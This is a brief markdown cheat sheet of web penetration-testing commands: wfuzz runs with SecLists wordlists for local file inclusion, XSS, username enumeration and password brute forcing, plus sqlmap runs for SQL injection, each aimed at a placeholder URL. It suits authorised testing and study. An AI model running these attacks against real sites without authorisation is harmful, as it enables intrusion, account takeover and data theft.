# Testing vulnerabilities 

## Directory Traversal

### LFI standard paths
```shell
wfuzz -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 0 $URL/specials?menu=FUZZ
```

### LFI custom paths and files
Create two wordlists:
1. Containing paths (paths.txt):
   ../
   ../../
   etc.
2. Containing custom files (files.txt): application.properties, applitcation.yml
```shell
wfuzz -w paths.txt -w files.txt --hh 0 $URL/specials?menu=FUZZFUZ2Z
```

## SQL Injection

### GET parameters
```shell
sqlmap -u "$URL?id=1"
```

### POST request
Copy POST request from Burp Suite into `post.txt` file
```shell
sqlmap -r post.txt -p parameter
```

## XSS
```shell
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$URL/specials?menu=FUZZ"
```

## Brute forcing 

### Users discovery

```shell
wfuzz -c -z file,/usr/share/SecLists/Usernames/top-username-shortlist.txt --hc 404,403 "$URL/index.php?user=FUZZ"
```

### Password discovery
```shell
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" "$URL/login.php"
```
